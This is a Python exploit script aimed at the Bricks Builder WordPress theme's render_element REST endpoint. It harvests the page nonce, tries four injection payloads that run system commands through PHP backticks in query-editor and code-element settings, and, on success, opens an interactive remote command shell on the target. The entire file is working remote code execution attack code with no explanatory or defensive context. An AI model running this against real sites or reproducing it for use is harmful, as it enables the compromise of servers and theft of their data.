#!/usr/bin/python3

import httpx
import asyncio
from bs4 import BeautifulSoup
import re
import sys
import base64

target = sys.argv[1]
path = '/wp-json/bricks/v1/render_element'


print('[*] Getting nonce')
with httpx.Client(verify=False) as client_n:
    r = client_n.get(url=target)
    soup = BeautifulSoup(r.text, 'html.parser')
    find_nonce = soup.find('script', id='bricks-scripts-js-extra')
    if find_nonce:
        if find_nonce.get('src'):
            find_nonce_decode = base64.b64decode(find_nonce.get('src').split(',')[1])
            nonce = re.search('"nonce":"([a-f0-9]+)"', find_nonce_decode.decode())
            Nonce_id = nonce[1]
            print(f'[+] Nonce get {Nonce_id}')
        else:
            nonce = re.search('"nonce":"([a-f0-9]+)"', find_nonce.string)
            Nonce_id = nonce[1]
            print(f'[+] Nonce get {Nonce_id}')
    else:
        print('[-] Error of getting nonce')

async def fst_payload(target=target, path=path):
    async with httpx.AsyncClient(verify=False) as client:
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "postId": "1",
            "nonce": Nonce_id,
            "element": {
                "name": "container",
                "settings": {
                    "hasLoop": "true",
                    "query": {
                        "useQueryEditor": True,
                        "queryEditor": "throw new Exception(`id`);",
                        "objectType": "post"
                    }
                }
            }
        }

        r = await client.post(url=f'{target}{path}', json=data)
        if 'Exception' in r.text:
            fst_payload_check = True
            while True:
                command = input('$ ')
                if command == 'exit':
                    print('[*] Exiting from shell')
                    sys.exit()
                    break
                elif command == 'clear':
                    sys.stdout.write("\x1b[2J\x1b[H")
                    continue
                elif command.strip() == '':
                    continue

                data_shell = {
                    "postId": "1",
                    "nonce": Nonce_id,
                    "element": "1",
                    "loopElement": {
                        "settings": {
                            "query": {
                                "useQueryEditor": "",
                                "queryEditor": f"throw new Exception(`{command}`);"
                            }
                        }
                    }
                }
                r = await client.post(url=f'{target}{path}', json=data_shell)
                if r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}', '').replace('Exception: ', '').strip()
                elif r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}', '').replace('Exception: ', '').strip()
                print(output)
        else:
            fst_payload_check = False
            print(f'[-] First payload working: {fst_payload_check}')

async def snd_payload(target=target, path=path):
    async with httpx.AsyncClient(verify=False) as client:
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "postId": "1",
            "nonce": Nonce_id,
            "element": {
                "name": "carousel",
                "settings": {
                    "type": "posts",
                    "query": {
                        "useQueryEditor": "true",
                        "queryEditor": "throw new Exception(`id`);",
                        "objectType": "post"
                    }
                }
            }
        }

        r = await client.post(url=f'{target}{path}', json=data)
        if 'Exception' in r.text:
            snd_payload_check = True
            while True:
                command = input('$ ')
                if command == 'exit':
                    print('[*] Exiting from shell')
                    sys.exit()
                    break
                elif command == 'clear':
                    sys.stdout.write("\x1b[2J\x1b[H")
                    continue
                elif command.strip() == '':
                    continue

                data_shell = {
                    "postId": "1",
                    "nonce": Nonce_id,
                    "element": "1",
                    "loopElement": {
                        "settings": {
                            "query": {
                                "useQueryEditor": "",
                                "queryEditor": f"throw new Exception(`{command}`);"
                            }
                        }
                    }
                }
                r = await client.post(url=f'{target}{path}', json=data_shell)
                if r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}', '').replace('Exception: ', '').strip()
                elif r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}', '').replace('Exception: ', '').strip()
                print(output)
        else:
            snd_payload_check = False
            print(f'[-] Second payload working: {snd_payload_check}')

async def third_payload(target=target, path=path):
    async with httpx.AsyncClient(verify=False) as client:
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "postId": "1",
            "nonce": Nonce_id,
            "element": "1",
            "loopElement": {
                "settings": {
                    "query": {
                        "useQueryEditor": "",
                        "queryEditor": "throw new Exception(`id`);"
                    }
                }
            }
        }

        r = await client.post(url=f'{target}{path}', json=data)
        if 'Exception' in r.text:
            third_payload_check = True
            while True:
                command = input('$ ')
                if command == 'exit':
                    print('[*] Exiting from shell')
                    sys.exit()
                    break
                elif command.strip == '':
                    continue
                elif command == 'clear':
                    sys.stdout.write("\x1b[2J\x1b[H")
                    continue
                data_shell = {
                    "postId": "1",
                    "nonce": Nonce_id,
                    "element": "1",
                    "loopElement": {
                        "settings": {
                            "query": {
                                "useQueryEditor": "",
                                "queryEditor": f"throw new Exception(`{command}`);"
                            }
                        }
                    }
                }
                r = await client.post(url=f'{target}{path}', json=data_shell)
                if r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}', '').replace('Exception: ', '').strip()
                elif r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}', '').replace('Exception: ', '').strip()
                print(output)
        else:
            third_payload_check = False
            print(f'[-] Third payload working: {third_payload_check}')

async def fourth_payload(target=target, path='/index.php?rest_route=/bricks/v1/render_element'):
    async with httpx.AsyncClient(verify=False) as client:
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "postId": "1",
            "nonce": Nonce_id,
            "element": {
                "name": "code",
                "settings": {
                    "executeCode": "true",
                    "code": "<?php throw new Exception(`id`);?>"
                }
            }
        }

        r = await client.post(url=f'{target}{path}', json=data)
        if 'Exception' in r.text:
            fourth_payload_check = True
            while True:
                command = input('$ ')
                if command == 'exit':
                    print('[*] Exiting from shell')
                    sys.exit()
                    break
                elif command == 'clear':
                    sys.stdout.write("\x1b[2J\x1b[H")
                    continue
                elif command.strip() == '':
                    continue

                data_shell = {
                    "postId": "1",
                    "nonce": Nonce_id,
                    "element": "1",
                    "loopElement": {
                        "settings": {
                            "query": {
                                "useQueryEditor": "",
                                "queryEditor": f"throw new Exception(`{command}`);"
                            }
                        }
                    }
                }
                r = await client.post(url=f'{target}{path}', json=data_shell)
                if r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Element &quot;&quot; doesn&#039;t exist.<\/div>"}}', '').replace('Exception: ', '').strip()
                elif r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}' in r.text:
                    output = r.text.replace(r'{"data":{"html":"<div class=\"bricks-element-placeholder no-php-class\">Das Element &quot;&quot; existiert nicht.<\/div>"}}', '').replace('Exception: ', '').strip()
                print(output)
        else:
            fourth_payload_check = False
            print(f'[-] Fourth payload working: {fourth_payload_check}')

asyncio.run(fst_payload())
asyncio.run(snd_payload())
asyncio.run(third_payload())
asyncio.run(fourth_payload())